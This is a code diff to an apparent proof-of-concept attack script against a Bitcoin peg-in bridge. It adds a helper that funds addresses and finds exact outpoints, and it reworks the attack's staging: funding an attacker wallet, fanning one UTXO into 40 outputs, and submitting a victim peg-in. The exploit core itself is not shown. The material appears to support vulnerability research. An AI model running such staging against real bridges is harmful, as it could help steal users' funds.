@@ -729,6 +729,27 @@ def mine(n):
     return addr
 
 
+def fund_address(addr, amount_btc, spk_hex):
+    """Send `amount_btc` to `addr`, mine it, and return the exact outpoint.
+
+    listunspent cannot be used for these addresses: bitcoind only reports UTXOs
+    whose key it holds, and the PoC signs with its own keys, so the output is
+    invisible to the wallet even though the tx is a wallet tx. -txindex gives us
+    the vout directly.
+    """
+    txid = btc("sendtoaddress", [addr, amount_btc])
+    mine(1)
+    raw = btc("getrawtransaction", [txid, True])
+    want = int(round(amount_btc * 1e8))
+    for out in raw.get("vout", []):
+        spk = ((out.get("scriptPubKey") or {}).get("hex") or "").lower()
+        if spk == spk_hex.lower() and int(round(out["value"] * 1e8)) == want:
+            return txid, out["n"], want
+    raise RuntimeError(
+        "tx %s has no %d sat output paying %s (vouts: %s)"
+        % (txid, want, addr, [(o["n"], o["value"]) for o in raw.get("vout", [])]))
+
+
 def btc_best_chain_height() -> int:
     raw = bridge_call(sel("getBtcBlockchainBestChainHeight()"))
     return int.from_bytes(raw[:32], "big")
@@ -769,26 +790,24 @@ def stage_attack():
 
     # ---- fund the attacker wallet -------------------------------------
     attacker_addr = p2pkh_address(ATTACKER.public_key.format(True))
-    if "funding" not in st:
-        btc("sendtoaddress", [attacker_addr, 0.8])
-        mine(1)
-        log("[attack] funded attacker %s with 0.5 BTC" % attacker_addr)
-
-    unspent = [u for u in btc("listunspent", [1, 9999999, [attacker_addr]]) if u["amount"] > 0.45]
-    if not unspent:
-        raise RuntimeError("no mature UTXO for the attacker")
-    u = unspent[0]
-    prev_txid = bytes.fromhex(u["txid"])[::-1]
     prev_script = p2pkh_script(ATTACKER.public_key.format(True))
+    if "attack_funding" not in st:
+        txid, vout, sat = fund_address(attacker_addr, 0.8, prev_script.hex())
+        st["attack_funding"] = {"txid": txid, "vout": vout, "sat": sat}
+        save_state(st)
+        log("[attack] funded attacker %s with %.8f BTC (%s:%d)"
+            % (attacker_addr, sat / 1e8, txid[:18], vout))
+    fu = st["attack_funding"]
+    prev_txid = bytes.fromhex(fu["txid"])[::-1]
 
     # ---- fan out one UTXO into 40 branches -----------------------------
     if "funding_txid" not in st:
         outs = [(FANOUT_VALUE, prev_script)] * ATTACK_COUNT
         total = FANOUT_VALUE * ATTACK_COUNT
         fee = 2_000 + ATTACK_COUNT * 34
-        change = int(u["amount"] * 1e8) - total - fee
+        change = fu["sat"] - total - fee
         outs.append((change, prev_script))
-        raw, txid = sign_tx(ATTACKER, prev_txid, u["vout"], prev_script, outs)
+        raw, txid = sign_tx(ATTACKER, prev_txid, fu["vout"], prev_script, outs)
         btc("sendrawtransaction", [raw.hex()])
         mine(1)
         log("[attack] fan-out tx %s -> %d x %d sat" % (txid[::-1].hex(), ATTACK_COUNT, FANOUT_VALUE))
@@ -825,19 +844,19 @@ def stage_attack():
     # ---- the victim: one ordinary, perfectly valid peg-in --------------
     if "victim_txid" not in st:
         vaddr = p2pkh_address(VICTIM.public_key.format(True))
-        # needs to be strictly larger than VICTIM_PEGIN_SAT + fee, or the change
-        # output would be negative and the transaction could not be built
-        btc("sendtoaddress", [vaddr, 0.05])
-        mine(1)
-        vu = [x for x in btc("listunspent", [1, 9999999, [vaddr]]) if x["amount"] > 0.04][0]
-        v_prev = bytes.fromhex(vu["txid"])[::-1]
         v_script = p2pkh_script(VICTIM.public_key.format(True))
+        if "victim_funding" not in st:
+            vtxid, vvout, vsat = fund_address(vaddr, 0.05, v_script.hex())
+            st["victim_funding"] = {"txid": vtxid, "vout": vvout, "sat": vsat}
+            save_state(st)
+        vf = st["victim_funding"]
+        v_prev = bytes.fromhex(vf["txid"])[::-1]
         v_fee = 1_000
-        v_change = int(vu["amount"] * 1e8) - VICTIM_PEGIN_SAT - v_fee
+        v_change = vf["sat"] - VICTIM_PEGIN_SAT - v_fee
         if v_change <= 0:
             raise RuntimeError("victim funding too small: change would be %d sat" % v_change)
         v_outs = [(VICTIM_PEGIN_SAT, spk_active), (v_change, v_script)]
-        v_raw, v_txid = sign_tx(VICTIM, v_prev, vu["vout"], v_script, v_outs)
+        v_raw, v_txid = sign_tx(VICTIM, v_prev, vf["vout"], v_script, v_outs)
         btc("sendrawtransaction", [v_raw.hex()])
         log("[attack] victim peg-in %s (%d sat) -> %s" % (v_txid[::-1].hex(), VICTIM_PEGIN_SAT, vaddr))
         st["victim_txid"] = v_txid[::-1].hex()
